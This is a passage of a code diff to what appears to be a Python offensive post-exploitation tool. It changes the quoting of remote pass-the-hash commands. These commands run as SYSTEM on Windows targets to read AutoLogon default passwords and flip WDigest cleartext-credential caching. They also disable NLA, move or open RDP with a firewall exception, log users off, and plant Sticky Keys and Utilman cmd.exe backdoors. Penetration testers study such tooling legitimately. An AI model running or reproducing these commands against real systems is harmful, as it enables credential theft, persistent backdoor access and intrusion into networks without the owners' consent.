-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
 				sys.exit()	
 	
 			elif edq_autologon.upper()=='Q':
 				print colored("[+]Querying the status of AutoLogon:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				print colored("[+]Querying the status of Default Username:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultUserName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultUserName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				print colored("[+]Querying the status of Default Password:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				print colored("[+]Querying the status of Default Domain:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultDomainName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultDomainName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()	
@@ -4402,11 +4402,11 @@ if edq_wdigest!='n':
 				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling Wdigest:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				print colored("[+]Querying the status of Wdigest:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				sys.exit()	
@@ -4415,33 +4415,33 @@ if edq_wdigest!='n':
 				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling Wdigest:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				print colored("[+]Querying the status of Wdigest:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				
 				response = raw_input("[+]Do you wish to log a user off? Y/N (N): ")
 				if response in yesanswers:	
 					print colored("[+]Querying logged on users:",'green')
-					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 					print proc.communicate()[0]
 					response = raw_input("[+]Enter the ID of the user you wish to log off: ")
 					
 					if response !="":
 						print colored("[+]Attempting to log off user ID "+response,'green')
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C logoff "+response+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C logoff "+response+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						print proc.communicate()[0]
 						print colored("[+]Querying logged on users:",'green')
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						print proc.communicate()[0]
 
 				sys.exit()	
 	
 			elif edq_wdigest.upper()=='Q':
 				print colored("[+]Querying the status of Wdigest:",'green')
-				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 				sys.exit()
 			else:
@@ -4464,10 +4464,10 @@ if edq_nla!='n':
 				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling NLA:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 1' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 1' 2>/dev/null")
 
 				print colored("[+]Querying the status of NLA:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
 
 				sys.exit()	
 
@@ -4475,16 +4475,16 @@ if edq_nla!='n':
 				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')
 				
 				print colored("[+]Disabling NLA:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 0' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 0' 2>/dev/null")
 
 				print colored("[+]Querying the status of NLA:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
 
 				sys.exit()	
 	
 			elif edq_nla.upper()=='Q':
 				print colored("[+]Querying the status of NLA:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")
 
 				sys.exit()
 
@@ -4508,14 +4508,14 @@ if edq_trdp!='n':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Setting RDP port to 443:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 443' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 443' 2>/dev/null")
 
 				print colored("[+]Restarting RDP Service:\n",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")
 
 				print colored("[+]Querying the status of RDP Port:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
 
 				sys.exit()	
 
@@ -4523,20 +4523,20 @@ if edq_trdp!='n':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Setting RDP to default port of 3389:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 3389' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 3389' 2>/dev/null")
 
 				print colored("[+]Restarting RDP Service:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")
 
 				print colored("[+]Querying the status of RDP Port:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
 
 				sys.exit()	
 	
 			elif edq_trdp.upper()=='Q':
 				print colored("[+]Querying the status of RDP Port:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")
 
 				sys.exit()
 
@@ -4560,16 +4560,16 @@ if edq_rdp!='n':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Enabling RDP:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 0' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 0' 2>/dev/null")
 
 				print colored("[+]Starting RDP Service:\n",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\"' 2>/dev/null")
 
 				print colored("[+]Enabling Firewall Exception:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = enable' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = enable' 2>/dev/null")
 
 				print colored("[+]Querying the status of RDP:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
 
 				sys.exit()	
 
@@ -4577,22 +4577,22 @@ if edq_rdp!='n':
 				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')
 
 				print colored("[+]Disabling RDP:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 1' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 1' 2>/dev/null")
 
 				print colored("[+]Stopping RDP Service:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
 
 				print colored("[+]Disabling Firewall Exception:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = disable' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = disable' 2>/dev/null")
 
 				print colored("[+]Querying the status of RDP:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
 
 				sys.exit()	
 	
 			elif edq_rdp.upper()=='Q':
 				print colored("[+]Querying the status of RDP:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")
 
 				sys.exit()
 
@@ -4624,17 +4624,17 @@ if edq_backdoor!='n':
 				if response =="1":
 					print colored("[+]Enabling BACKDOOR 1: Sticky Keys",'green')
 					print colored("[+]To use press left shift multiple times at a Locked Workstation:",'yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
 					sys.exit()
 				elif response=="2":
 					print colored("[+]Enabling BACKDOOR 2: Utilman",'green')
 					print colored("[+]To use press Windows Key + U at a Locked Workstation:",'yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
 					sys.exit()
 				elif response=="3":
 					print colored("[+]Enabling BACKDOOR 3: TaskManager",'green')
 					print colored("[+]To use press Windows Key + U at a Locked Workstation:",'yellow')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\\taskmgr.exe\" /f' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\\taskmgr.exe\" /f' 2>/dev/null")
 					sys.exit()
 				
 				sys.exit()
@@ -4649,11 +4649,11 @@ if edq_backdoor!='n':
 
 				if response =="1":
 					print colored("[+]Disabling BACKDOOR 1: Sticky Keys",'green')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"  /t REG_SZ /d \"\" /f' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"  /t REG_SZ /d \"\" /f' 2>/dev/null")
 					sys.exit()
 				elif response=="2":
 					print colored("[+]Disabling BACKDOOR 2: Utilman",'green')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"\" /f' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"\" /f' 2>/dev/null")
 					sys.exit()
 				
 				sys.exit()
@@ -4662,10 +4662,10 @@ if edq_backdoor!='n':
 				print colored("[+]Querying the status of Backdoors:",'green')
 
